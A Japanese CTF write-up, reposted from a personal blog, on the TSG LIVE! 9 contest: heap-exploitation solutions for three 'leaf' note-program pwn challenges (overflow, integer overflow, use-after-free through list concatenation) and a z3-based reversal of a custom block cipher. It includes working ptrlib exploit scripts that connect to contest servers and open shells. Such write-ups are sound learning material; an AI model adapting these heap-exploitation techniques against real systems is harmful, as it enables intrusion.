---
title: TSG LIVE! 9に参加しました
url: https://buaq.net/go-136478.html
source: unSafe.sh - 不安全
date: 2022-11-21
fetch_date: 2025-10-03T23:18:49.789842
---

# TSG LIVE! 9に参加しました

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

TSG LIVE! 9に参加しました

先日、皆さんおなじみのTSG LIV
*2022-11-20 20:7:40
Author: [ptr-yudai.hatenablog.com(查看原文)](/jump-136478.htm)
阅读量:18
收藏*

---

先日、皆さんおなじみのTSG LIVE!が開催されました。

本来山登りの途中で参加する予定でしたが、[筑波山](http://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%C8%BB%EF%BF%BD)に[ユニバーサル・スタジオ](http://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%CB%A5%D0%A1%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EB%A1%A6%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD)ができたらしく人間が多いようだったのでキャンセルしました。
深夜に登りに行く話もあったのですが、一緒に行く[過半数](http://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%C8%BE%EF%BF%BD%EF%BF%BD)が人間だったため、多数決で早朝登りになりました。
早朝起きるつらさは山登りの魅力に勝らず...

![ 深夜の山 > TSG\ LIVE ≒ 山 > 早朝の山 > 混雑した山](https://chart.apis.google.com/chart?cht=tx&chl=%20%E6%B7%B1%E5%A4%9C%E3%81%AE%E5%B1%B1%20%3E%20TSG%5C%20LIVE%20%E2%89%92%20%E5%B1%B1%20%3E%20%E6%97%A9%E6%9C%9D%E3%81%AE%E5%B1%B1%20%3E%20%E6%B7%B7%E9%9B%91%E3%81%97%E3%81%9F%E5%B1%B1)

* [[pwn] lose leaf](#pwn-lose-leaf)
* [[pwn] loose leaf](#pwn-loose-leaf)
* [[pwn] looose leaf](#pwn-looose-leaf)
* [[rev] anger](#rev-anger)
* [[rev] anger-against-anger](#rev-anger-against-anger)
* [感想](#感想)
* [おまけ](#おまけ)

盛大に壊れたプログラムが与えられます。

```
typedef struct Page {
    struct Page *next;
    char content[];
} Page;
...
  readn(page, size);
```

先にinteger overflowを見つけていたので「昨日酒飲んだからmoraさん頭おかしくなっちゃったのかな」と思っていましたが、integer overflowは次の問題でした。
問1でももっと難しくしてええんやで。

```
from ptrlib import *

def modify(index):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(index))
def add_page(index, size, data):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(size))
    if len(data) == size:
        sock.sendafter(": ", data)
    else:
        sock.sendlineafter(": ", data)
def delete_page(index):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", str(index))
def back():
    sock.sendlineafter("> ", "3")

def concat(index):
    sock.sendlineafter("> ", "2")

sock = Process("./chall")

modify(0)
payload = p64(0x404140 - 8)
add_page(0, 0x18, payload)
back()

sock.sendlineafter("> ", "3")
sock.sendlineafter(": ", "0")

sock.sh()
```

フラグが`TSGLIVE{`から始まるということで、最初ポインタをフラグ先頭に向けていました。
配布されていたサンプルフラグは`LIVECTF{`みたいなフォーマットだったのでそれを付け足して送りましたが、通りませんでした。
うだうだしていて質問しても問題ないとのことで、8バイト引いたら配布されたフォーマットが間違っていました。
終わり。

やりたい放題。

```
    printf("size: ");
    unsigned size = get_int();
    Page *page = (Page *)malloc(size + 8);
    page->next = next;
    printf("data: ");
    readn(page, size);
```

やるだけ。

```
sock = Socket("nc 104.198.95.69 30002")

modify(0)
add_page(0, 0xfffffff8, b"A")
add_page(1, 0x18, b"B"*0x10)
add_page(2, 0x18, b"C"*0x10)
delete_page(0)
payload = b"D"*0x48 + p64(0x404138)
add_page(1, 0xfffffff8, payload)
back()

sock.sh()
```

integer overflowが潰されます。この時点でまだ見ていなかったのはconcat機能なので、そこにバグがあるのでしょう。

```
void concat_notes(unsigned idx1, unsigned idx2, unsigned idx3) {
    notes[idx3] = notes[idx1];
    Page **cur = &notes[idx3];
    while(*cur != NULL) {
        cur = &(*cur)->next;
    }
    *cur = notes[idx2];
    notes[idx1] = NULL;
    notes[idx2] = NULL;
}
```

こういう機能はたいてい同じインデックスを入れると爆死します。
今回の場合、同じリストを連結すると無限ループができます。
無限ループができると、最初のノートを破棄したときに2つ目のノートが最初のノートを指したままになり、Use-after-Freeになります。

あとはどうやってポインタ部分を書き換えるかですが、適当にチャンクをbackward consolidateさせてポインタ部分とデータ部分がかぶるようにします。

```
sock = Socket("nc 104.198.95.69 30003")

modify(2)
add_page(0, 0x420, b"1"*0x420)
add_page(1, 0x500, b"1"*0x500)
delete_page(1)
back()

modify(0)
add_page(0, 0x420, b"A"*0x420)
add_page(1, 0x10, b"B"*0x10)
back()

concat(0,0,1)
modify(1)
delete_page(0)
back()
modify(2)
delete_page(0)
payload  = b"C"*0x428
payload += p64(0x404140 - 8)
add_page(0, 0x500, payload)
back()
```

最初のフラグ送信ミスがありましたが、pwnは全部で30分ほどで終わっていたようです。
スコアボードが一瞬で消滅したので正確な時間は分かりません。

時間内には解けませんでした。
問題自体がかなりangrのバージョンとかマシン性能とかコード依存だったので、問題名通りキレながらバイナリを読み始めました。

40分くらいで気合で全部読むと、キモいブロック暗号であることが分かります。
まず「This is the key」という鍵で謎のSboxっぽいものを初期化し、その後「This is the iv.」をIVとしてブロック暗号を始めます。

4バイトごとの暗号化を4回して1ブロックを処理しますが、その処理自体が2回走ります。
そしてその前後が同じ1ブロックの暗号でサンドイッチされています。
ループカウンタの実装がかなりキモくて復号処理の実装をミスって時間を溶かしました。死刑です。

```
from ptrlib import *
from z3 import *

"""
typedef struct {
  char key[0xb0];
  char iv[0x10]; // +B0h
  char flag[0x100];
};
"""
with open("problem", "rb") as f:
    f.seek(0x20c0)
    enc = f.read(0x40)
with open("fuck", "rb") as f:
    f.seek(0x60e0)
    enc = f.read(0x40)

def blah(c):
    return ((27 * LShR(c, 7)) ^ (2 * c)) & 0xff

def get_models(solver, num_models):
    n = 0
    while n < num_models and solver.check() == sat:
        try:
            model = solver.model()
            n += 1
            yield model
            block = []
            for declaration in model:
                c = declaration()
                block.append(c != model[declaration])
            solver.add(Or(block))
            solver.push()
        except KeyboardInterrupt:
            print("interrupted")
            break

sbox = flat([
    0x2073692073696854, 0x0079656b20656874,
    0x2c79b7380c0ade18, 0x0c65ba270c1cdf4c,
    0xec8d24d6c0f493ee, 0xecf441bde091fb9a,
    0x56b708bfba3a2c69, 0x5ad2b298b626f325,
], map=p64)

def rev_blk(vec):
    c1 = BitVec('c1', 8)
    c2 = BitVec('c2', 8)
    c3 = BitVec('c3', 8)
    c4 = BitVec('c4', 8)
    s = Solver()
    s.add(c2^c3^c4^blah(c1^c2) == vec[0])
    s.add(c1^c3^c4^blah(c2^c3) == vec[1])
    s.add(c1^c2^c4^blah(c3^c4) == vec[2])
    s.add(c1^c2^c3^blah(c4^c1) == vec[3])
    for m in get_models(s, 1):
        print(m)
        vec = bytes([m[c1].as_long(), m[c2].as_long(), m[c3].as_long(), m[c4].as_long()])
    return vec

flag = b""
for v in range(4):
    vec = enc[v*0x10:(v+1)*0x10]
    print(vec)
    vec = xor(vec, sbox[0x30:0x40])
    for j in range(2, 0, -1):
        for i, block in enumerate(chunks(xor(vec, sbox[j*0x10:(j+1)*0x10]), 4)):
            b = rev_blk(block)
            vec = list(vec)
            vec[i*4+0] = b[0]
            vec[i*4+1] = b[1]
            vec[i*4+2] = b[2]
            vec[i*4+3] = b[3]
            vec = bytes(vec)
        print(vec)
    vec = xor(vec, sbox[0x00:0x10])
    flag += vec

iv = b"This is the iv."
for i in range(4):
    print(xor(flag[i*0x10:(i+1)*0x10], iv).decode(), end="")
    iv = enc[i*0x10:(i+1)*0x10]
```

yoshikingがUPXを展開してくれていたのでバイナリとオフセットを差し替えるとフラグが出ます。

rev力よりも実装力がありませんでした......

ひと頑張りしたら寿司でも食べる予定でしたが、またも時間切れというカスをやらかしたので[ずんだ餅](http://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD)にとどめました。

それはさておき、深夜登山したいです。あと[富士急行](http://d.hatena.ne.jp/keyword/%EF%BF%BD%D9%BB%CE%B5%DE%B9%EF%BF%BD)きたい。

TSG LIVE作問陣の人々、聞こえていますか・・・？

スピードが問われるCTFを開催するときのお得🉐🉐🉐情報があります！
同じジャンルの問題名は同じ単語から始めないのがおすすめです。
「[hoge](http://d.hatena.ne.jp/keyword/hoge) 1」「[hoge](http://d.hatena.ne.jp/keyword/hoge) 2」みたいな問題名にすると、フォルダ名の先頭がかぶりcdするときに時間のロスになります。
以上、RTACTF運営からのお得🉐🉐🉐情報でした。

文章来源: https://ptr-yudai.hatenablog.com/entry/2022/11/20/210740
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)